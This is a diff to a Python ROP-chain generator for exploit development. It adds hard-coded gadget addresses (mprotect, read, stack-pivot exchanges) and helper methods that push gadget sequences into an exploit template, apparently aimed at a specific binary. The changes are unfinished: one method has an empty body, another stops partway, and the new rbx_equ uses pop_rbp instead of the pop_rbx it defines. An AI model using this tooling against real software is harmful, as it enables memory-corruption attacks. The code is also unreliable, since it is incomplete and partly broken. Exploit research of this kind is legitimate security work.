@@ -2,10 +2,8 @@
 
 from exploiterTemplate import exploiterTemplate
 from json.tool import main
-from exploiter import exploiter
 
 ea_data = 0x00000000006C1060
-#exp = exploiter()
 
 derefer_rax_rax = 0x000000000048fcf0 # mov rax, qword ptr [rax] ; add rsp, 8 ; ret
 push_rcx        = 0x0000000000406F03 
@@ -17,6 +15,12 @@ mprotect_addr   = 0x0000000000435690
 read_addr       = 0x0000000000434B20
 exit_addr       = 0x0000000000434180
 nop_gadet       = 0x0000000000408B87
+cmov_rax_rdx    = 0x000000000048D057
+xchg_eax_esp    = 0x000000000040037f
+add_eax_edi     = 0x000000000041C673
+mov_eax_esp     = 0x00000000004236DB
+xchg_eax_ebx    = 0x0000000000459339
+pop_rbx         = 0x000000000040B7CE
 
 class metaGadetGenerator:
     def __init__(self, exp : exploiterTemplate) -> None:
@@ -69,6 +73,11 @@ class metaGadetGenerator:
         self.rdi_equ(pre.TEMP1)
         self.rdx_equ(pre.TRASH1)
         self.exp.add_gadet(0x000000000040F170) # mov rcx, qword ptr [rdi] ; mov qword ptr [rdx], rcx ; ret
+
+
+    def rbx_equ(self, val):
+        self.exp.add_gadet(pop_rbp)
+        self.exp.add_gadet(val)
 
     # Side-Effect: Changes rbx
     def mov_rsi_rax(self, pre):
@@ -165,6 +174,42 @@ class metaGadetGenerator:
         self.exp.add_gadet(derefer_rax_rax)
         # Add padding for add rsp
         self.exp.add_gadet(0x0000000000000000)
+
+
+    # 32 Bit
+    def eax_equ_esp(self):
+        self.exp.add_gadet(mov_eax_esp)
+
+        # Add padding for the pop r12
+        self.exp.add_gadet(0x0000000000000000)
+
+
+    # 32 Bit
+    # Side effect: Zeros RBX
+    # Params:
+    #           EAX - jump offset
+    def rsp_add_immediate_rax(self):
+        '''
+        self.exp.add_gadet(xchg_eax_esp)
+
+        self.rdi_equ(offset)
+        self.exp.add_gadet(add_eax_edi)
+
+        self.exp.add_gadet(xchg_eax_esp)
+        '''
+
+        # Save 32 first bits for computation
+        self.exp.add_gadet(mov_eax_esp)
+        self.exp.add_gadet(xchg_eax_ebx)
+
+        # ebx holds 32 LSB of RSP
+
+
+
+
+
+    def jump_if_equal(self, offset, cell_ea):
+        
 
 
     def finalize(self):        
